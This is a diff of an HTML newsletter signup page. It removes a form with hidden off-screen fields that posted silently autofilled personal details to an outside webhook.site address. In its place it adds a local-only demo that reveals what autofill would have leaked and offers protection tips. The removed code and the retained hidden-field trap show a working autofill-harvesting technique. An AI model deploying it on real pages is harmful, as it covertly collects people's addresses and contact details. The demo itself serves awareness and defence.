@@ -6,28 +6,20 @@
   <title>Subscribe to our newsletter</title>
   <style>
     :root {
-      --bg: #0f172a;        /* slate-900 */
-      --card: #111827;      /* gray-900 */
-      --text: #e5e7eb;      /* gray-200 */
-      --muted: #94a3b8;     /* slate-400 */
-      --brand: #22c55e;     /* green-500 */
-      --brand-press: #16a34a; /* green-600 */
-      --danger: #ef4444;    /* red-500 */
+      --bg: #0f172a; --card: #111827; --text: #e5e7eb; --muted: #94a3b8;
+      --brand: #22c55e; --brand-press: #16a34a; --danger: #ef4444; --warn: #f59e0b;
     }
     * { box-sizing: border-box; }
     body {
-      margin: 0; font-family: system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell, "Helvetica Neue", Noto Sans, Arial, "Apple Color Emoji", "Segoe UI Emoji";
+      margin: 0; font-family: system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell, "Helvetica Neue", Noto Sans, Arial;
       background: radial-gradient(1200px 600px at 70% -10%, #1f2937, transparent), var(--bg);
-      color: var(--text);
-      min-height: 100vh; display: grid; place-items: center;
+      color: var(--text); min-height: 100vh; display: grid; place-items: center; padding: 1rem;
     }
     .card {
-      width: min(92vw, 520px);
-      height: 300px;
+      width: min(92vw, 560px); min-height: 300px;
       background: linear-gradient(180deg, #0b1220, #0b1220) padding-box, linear-gradient(135deg, #22c55e44, #06b6d444) border-box;
-      border: 1px solid transparent;
-      border-radius: 1.25rem; /* 2xl */
-      padding: 2rem; box-shadow: 0 10px 30px rgba(0,0,0,.45);
+      border: 1px solid transparent; border-radius: 1.25rem; padding: 2rem; box-shadow: 0 10px 30px rgba(0,0,0,.45);
+      overflow: hidden;
     }
     h1 { font-size: clamp(1.4rem, 2vw + 1rem, 2rem); margin: 0 0 .75rem; }
     p { color: var(--muted); margin: 0 0 1.25rem; }
@@ -35,85 +27,112 @@
     label { font-size: .95rem; }
     .row { display: grid; gap: .5rem; grid-template-columns: 1fr auto; align-items: start; }
     input[type="email"] {
-      width: 100%; padding: .85rem 1rem; border-radius: .875rem;
-      border: 1px solid #1f2937; background: #0b1220; color: var(--text);
-      outline: none; box-shadow: inset 0 1px 0 rgba(255,255,255,.02);
+      width: 100%; padding: .85rem 1rem; border-radius: .875rem; border: 1px solid #1f2937;
+      background: #0b1220; color: var(--text); outline: none;
     }
     input[type="email"]:focus { border-color: #334155; }
     button {
       padding: .85rem 1.1rem; border-radius: .875rem; border: 0; cursor: pointer;
-      background: var(--brand); color: #06200e; font-weight: 600; letter-spacing: .2px;
-      transition: transform .05s ease, background .2s ease, opacity .2s ease;
+      background: var(--brand); color: #06200e; font-weight: 600;
     }
     button:hover { background: #1bc159; }
     button:active { transform: translateY(1px); background: var(--brand-press); }
-    button[disabled] { opacity: .6; cursor: not-allowed; }
-
     .help { font-size: .85rem; color: var(--muted); }
-    .msg { margin-top: .75rem; font-size: .95rem; }
-    .msg.error { color: var(--danger); }
-    .sr-only { position: absolute; width: 1px; height: 1px; padding: 0; margin: -1px; overflow: hidden; clip: rect(0,0,1,1); border: 0; white-space: nowrap; }
 
-    /* Honeypot field hidden from humans */
-    .hp { position: absolute; left: -9999px; }
+    /* Hidden autofill trap: off-screen but still "fillable" by the browser */
+    .trap { position: absolute; left: -9999px; top: auto; width: 1px; height: 1px; overflow: hidden; }
+
+    /* Reveal panel */
+    #reveal { display: none; }
+    #reveal h2 { color: var(--danger); margin: 0 0 .5rem; font-size: 1.4rem; }
+    table { width: 100%; border-collapse: collapse; margin: 1rem 0; font-size: .95rem; }
+    th, td { text-align: left; padding: .5rem .6rem; border-bottom: 1px solid #1f2937; vertical-align: top; }
+    th { color: var(--muted); font-weight: 500; }
+    tr.hidden-field td { background: #ef444415; }
+    .tag { font-size: .75rem; padding: .1rem .45rem; border-radius: .4rem; white-space: nowrap; }
+    .tag.vis { background: #22c55e22; color: var(--brand); }
+    .tag.hid { background: #ef444422; color: var(--danger); }
+    .empty { color: #475569; font-style: italic; }
+    .tips { font-size: .9rem; color: var(--text); padding-left: 1.1rem; }
+    .tips li { margin-bottom: .35rem; }
+    .note { font-size: .8rem; color: var(--muted); margin-top: 1rem; }
   </style>
 </head>
 <body>
-  <main class="card" role="main" aria-labelledby="title">
-    <h1 id="title">Join our newsletter</h1>
-    <p>Get product updates, tips, and occasional notes. No spam. Unsubscribe anytime.</p>
+  <main class="card" role="main">
+    <!-- Step 1: the lure -->
+    <section id="lure">
+      <h1>Join our newsletter</h1>
+      <p>Get product updates, tips, and occasional notes. No spam. Unsubscribe anytime.</p>
 
-    <!-- If you have a backend endpoint, set the action to it and remove JS below for pure HTML POST -->
-    <form name="addr1.sections" id="sections1" action="https://webhook.site/ae624f7a-aff0-4248-9104-3973562580ec" method="post">
-      <div class="row">
-        <div>
-          <label for="email">Email address</label>
-          <input
-            id="email"
-            type="email"
-            name="email"
-            placeholder="you@example.com"
-            autocomplete="email"
-            inputmode="email"
-            required
-            aria-describedby="email-help"
-          />
-          <div id="email-help" class="help">We’ll send a confirmation email. Please use a valid address.</div>
+      <form id="sections1" autocomplete="on">
+        <div class="row">
+          <div>
+            <label for="email">Email address</label>
+            <input id="email" type="email" name="email" placeholder="you@example.com"
+                   autocomplete="email" inputmode="email" required />
+            <div class="help">We’ll send a confirmation email. Please use a valid address.</div>
+          </div>
+          <div style="align-self:end;">
+            <button type="submit">Subscribe</button>
+          </div>
         </div>
-        <div style="align-self:end;">
-          <button id="submit-btn" type="submit">Subscribe</button>
+
+        <!-- Hidden fields the browser may autofill without the user noticing -->
+        <div class="trap" aria-hidden="true">
+          <input type="text" name="name"    autocomplete="name"           tabindex="-1">
+          <input type="tel"  name="phone"   autocomplete="tel"            tabindex="-1">
+          <input type="text" name="org"     autocomplete="organization"   tabindex="-1">
+          <input type="text" name="address" autocomplete="street-address" tabindex="-1">
+          <input type="text" name="city"    autocomplete="address-level2" tabindex="-1">
+          <input type="text" name="zip"     autocomplete="postal-code"    tabindex="-1">
+          <input type="text" name="country" autocomplete="country-name"   tabindex="-1">
         </div>
-         <div id="billing1">
-    
-    <p style="margin-left:-1500px">
-    Name: <input type="text" name="name"><br>
-    Address: <input type="text" name="address"><br>
-    City: <input type="text" name="city"><br>
-    State: <select name="state">
-      <option value="CA">CA</option>
-      <option value="MA">MA</option>
-      <option value="NY">NY</option>
-      <option value="MD">MD</option>
-      <option value="OR">OR</option>
-      <option value="OH">OH</option>
-      <option value="IL">IL</option>
-      <option value="DC">DC</option>
-    </select> <br>
-    Zip: <input name="zip"> <br>
-    Country: <input name="country"> <br>
-    <p style="margin-left:-1500px">
-  </div>
-      </div>
+      </form>
+    </section>
 
-      <!-- Honeypot field to deter bots -->
-      <label class="hp" for="website">Website (leave empty)</label>
-      <input class="hp" type="text" id="website" name="website" tabindex="-1" autocomplete="off" />
-
-      <div id="message" class="msg" aria-live="polite"></div>
-      
-    </form>
+    <!-- Step 2: the reveal -->
+    <section id="reveal" aria-live="polite">
+      <h2>⚠ This was an autofill test</h2>
+      <p style="color:var(--text)">You only saw <strong>one</strong> field. Here is everything your browser actually submitted:</p>
+      <table>
+        <thead><tr><th>Field</th><th>Value</th><th></th></tr></thead>
+        <tbody id="results"></tbody>
+      </table>
+      <p style="color:var(--text);margin-bottom:.4rem"><strong>How to protect yourself</strong></p>
+      <ul class="tips">
+        <li>Don’t accept browser autofill suggestions on sites you don’t fully trust — type it manually.</li>
+        <li>Review/limit the addresses and personal data saved in your browser and password manager.</li>
+        <li>Prefer a password manager that only fills on explicit action and on the matching domain.</li>
+      </ul>
+      <p class="note">Nothing was sent anywhere — this data was processed only in your browser and is gone when you close the tab.</p>
+    </section>
   </main>
 
-  
+  <script>
+    const LABELS = { email: "Email", name: "Name", phone: "Phone", org: "Organization",
+                     address: "Address", city: "City", zip: "Zip", country: "Country" };
+    const VISIBLE = new Set(["email"]);
+    const esc = s => s.replace(/[&<>"']/g, c => ({ "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;" }[c]));
+
+    document.getElementById("sections1").addEventListener("submit", e => {
+      e.preventDefault();                       // no network request
+      const data = new FormData(e.target);
+      const rows = [];
+      for (const [key, raw] of data.entries()) {
+        const value = String(raw).trim();
+        const hidden = !VISIBLE.has(key);
+        rows.push(`<tr class="${hidden && value ? "hidden-field" : ""}">
+          <td>${esc(LABELS[key] || key)}</td>
+          <td>${value ? esc(value) : '<span class="empty">empty</span>'}</td>
+          <td><span class="tag ${hidden ? "hid" : "vis"}">${hidden ? "hidden" : "visible"}</span></td>
+        </tr>`);
+      }
+      document.getElementById("results").innerHTML = rows.join("");
+      document.getElementById("lure").style.display = "none";
+      document.getElementById("reveal").style.display = "block";
+      e.target.reset();
+    });
+  </script>
 </body>
 </html>
